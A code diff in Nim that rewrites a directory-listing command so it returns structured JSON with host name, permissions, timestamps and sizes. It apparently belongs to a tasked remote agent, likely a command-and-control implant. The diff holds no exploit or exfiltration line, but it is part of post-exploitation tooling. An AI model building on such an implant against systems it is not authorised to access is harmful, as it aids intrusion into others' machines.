@@ -1,5 +1,5 @@
 import std/[os, json, strutils, times]
-import core/types
+import core/types, core/utils
 import commands/registry
 
 proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
@@ -9,23 +9,56 @@ proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
   let fullPath = if isAbsolute(path): path else: state.cwd / path
 
   try:
-    var lines: seq[string] = @[]
-    lines.add("Directory: " & fullPath)
-    lines.add("")
-    for kind, entry in walkDir(fullPath):
-      let info = getFileInfo(entry)
-      let name = lastPathPart(entry)
-      let mtime = format(info.lastWriteTime, "yyyy-MM-dd HH:mm")
-      let (typeChar, size) = case kind
-        of pcFile:        ("-", $info.size)
-        of pcDir:         ("d", "<DIR>")
-        of pcLinkToFile:  ("l", $info.size)
-        of pcLinkToDir:   ("l", "<DIR>")
-      lines.add(typeChar & "  " & mtime & "  " & align(size, 12) & "  " & name)
+    let dirInfo = getFileInfo(fullPath)
+    let files   = newJArray()
 
-    if lines.len <= 2:
-      lines.add("(empty directory)")
-    return TaskResult(output: lines.join("\n"), status: "success", completed: true)
+    for kind, entry in walkDir(fullPath):
+      let info   = getFileInfo(entry)
+      let isFile = kind in {pcFile, pcLinkToFile}
+      var perms: string
+      when not defined(windows):
+        let m = info.permissions
+        perms = (if fpUserRead    in m: "r" else: "-") &
+                (if fpUserWrite   in m: "w" else: "-") &
+                (if fpUserExec    in m: "x" else: "-") &
+                (if fpGroupRead   in m: "r" else: "-") &
+                (if fpGroupWrite  in m: "w" else: "-") &
+                (if fpGroupExec   in m: "x" else: "-") &
+                (if fpOthersRead  in m: "r" else: "-") &
+                (if fpOthersWrite in m: "w" else: "-") &
+                (if fpOthersExec  in m: "x" else: "-")
+      else:
+        perms = if isFile: "rw-r--r--" else: "rwxr-xr-x"
+
+      files.add(%*{
+        "is_file":     isFile,
+        "permissions": {"permissions": perms},
+        "name":        lastPathPart(entry),
+        "access_time": info.lastAccessTime.toUnix(),
+        "modify_time": info.lastWriteTime.toUnix(),
+        "size":        if isFile: info.size else: 0,
+      })
+
+    let fileBrowser = %*{
+      "host":           getHostname(),
+      "is_file":        false,
+      "permissions":    newJObject(),
+      "name":           lastPathPart(fullPath),
+      "parent_path":    parentDir(fullPath),
+      "success":        true,
+      "access_time":    dirInfo.lastAccessTime.toUnix(),
+      "modify_time":    dirInfo.lastWriteTime.toUnix(),
+      "size":           0,
+      "update_deleted": true,
+      "files":          files,
+    }
+
+    return TaskResult(
+      output:      $(%*{"file_browser": fileBrowser}),
+      status:      "success",
+      completed:   true,
+      extraFields: %*{"file_browser": fileBrowser},
+    )
   except Exception as e:
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
